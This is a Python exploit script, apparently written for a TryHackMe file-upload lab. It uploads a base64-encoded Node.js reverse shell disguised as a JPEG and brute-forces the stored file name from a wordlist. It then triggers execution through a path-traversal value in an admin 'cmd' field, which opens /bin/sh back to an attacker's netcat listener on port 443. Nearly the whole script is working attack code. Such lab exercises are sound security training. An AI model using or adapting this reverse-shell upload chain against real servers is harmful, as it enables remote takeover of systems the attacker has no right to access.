#!/usr/bin/env python3
import requests
import argparse
import base64


# proxies = {
#   "http":  "http://127.0.0.1:8080",
#   "https": "http://127.0.0.1:8080",
# }

def main():
  session = requests.Session()
  b64payload = base64.b64encode(f'!function(){{var e=require("net"),n=require("child_process").spawn("/bin/sh",[]),i=new e.Socket;i.connect({port},"{attacker_ip}",function(){{i.pipe(n.stdin),n.stdout.pipe(i),n.stderr.pipe(i)}})}}();'.encode('utf-8'))
  rawBody = "{\"name\":\"test2.jpg\",\"type\":\"image/jpeg\",\"file\":\"data:image/jpeg;base64,"+ b64payload.decode('utf-8')+"\"}"
  print("Sent " + rawBody +" payload to the server")
  headers = {f"Origin":"{target}","X-Requested-With":"XMLHttpRequest","Content-Type":"application/json"}
  session.post(f"http://{target}/", data=rawBody, headers=headers)#,proxies=proxies)

  with open(wordlist) as f:
    alist = [line.rstrip() for line in f]
    for line in alist:
      print("trying "+line)
      resp=session.get(f"http://{target}/content/{line}.jpg")#,proxies=proxies)
      if "cp.spawn" in resp.text:
        break
            
    try:
      session.post(f"http://{target}/admin",data = {"cmd":"../content/"+line+".jpg"},timeout=1.5)
    except requests.exceptions.RequestException as e:  # This is the correct syntax
      print(f"Your shell has been uploaded successfully at http://{target}/content/"+line + ".jpg") 
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TryHackMe Labs - Exploiting File upload vulnerability on jewel.uploadvulns.thm to get back a shell\
      ** Please run /bin/nc -lvnp 443 on attacking machine")
    parser.add_argument('--target','-t', dest='target', help='http://<target>', required=True)    
    parser.add_argument('--listener','-l', dest='attacker_ip', help="Listening Server", required=True)    
    parser.add_argument('--wordlist','-w', dest='wordlist', help="Wordlist", default='UploadVulnsWordlist.txt',required=True)    

    args = parser.parse_args()

    target = args.target
    port = 443
    attacker_ip=args.attacker_ip
    wordlist=args.wordlist
    main()
